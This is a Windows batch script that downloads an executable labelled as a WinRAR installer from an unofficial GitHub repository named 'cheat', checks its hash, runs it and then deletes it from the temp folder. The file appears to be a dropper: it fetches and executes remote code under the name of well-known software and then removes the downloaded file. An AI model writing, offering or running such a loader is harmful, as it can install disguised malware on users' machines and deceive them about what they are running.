@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=a1300a8b070817e6280579f5fb6d49d42c612160900ab8856ee4cccd4a9ebe04"
set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"

echo [1/4] Downloading file...
powershell -NoProfile -Command ^
  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
  "$u = $env:URL; $h = $env:HASH; $f = $env:OUT; " ^
  "if (Test-Path -LiteralPath $f) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue }; " ^
  "& curl.exe -L -s -f -o -- $f $u; " ^
  "if (-not (Test-Path -LiteralPath $f)) { try { (New-Object Net.WebClient).DownloadFile($u, $f) } catch { exit 1 } }; " ^
  "if (-not (Test-Path -LiteralPath $f)) { exit 1 }; " ^
  "Write-Host '[2/4] Checking SHA-256...'; " ^
  "$cur = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash; " ^
  "if ($cur.ToLowerInvariant() -ne $h.ToLowerInvariant()) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue; Write-Host 'ERROR: SHA-256 mismatch.'; exit 2 }; " ^
  "Write-Host '[3/4] Running installer...'; " ^
  "$p = Start-Process -FilePath $f -PassThru -Wait; " ^
  "Start-Sleep -Seconds 3; " ^
  "Write-Host '[4/4] Cleaning up...'; " ^
  "if (Test-Path -LiteralPath $f) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue }; " ^
  "exit $p.ExitCode"

set "EC=%ERRORLEVEL%"
if %EC% equ 1 echo ERROR: Failed to download file.
if %EC% equ 2 echo ERROR: Hash check failed.
if %EC% neq 0 if %EC% neq 1 if %EC% neq 2 echo Finished with exit code %EC%.

endlocal
exit /b %EC%
